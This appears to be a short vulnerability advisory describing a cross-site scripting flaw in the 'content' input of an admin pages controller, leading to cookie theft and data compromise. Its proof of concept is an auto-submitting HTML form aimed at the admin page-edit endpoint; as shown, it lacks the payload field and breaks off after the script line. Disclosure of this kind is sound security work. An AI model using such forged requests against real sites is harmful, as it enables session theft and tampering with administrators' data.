Vulnerability Details:
User can execute arbitrary JavaScript code within the vulnerable application.

The vulnerability exists due to failure in the "/application/modules/admin/controllers/pages.php" script to properly sanitize user-supplied input in "content" variable. Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.

An attacker can use browser to exploit this vulnerability. The following PoC is available:

<form action="http://host/admin/pages/edit" method="post" >
<input type="hidden" name="title" value="open blog page title" />

<input type="submit" name="submit" id="sbmtit" value="Edit &rsaquo;&rsaquo;" />
</form>
<script>
document.getElementById('sbmtit').click();
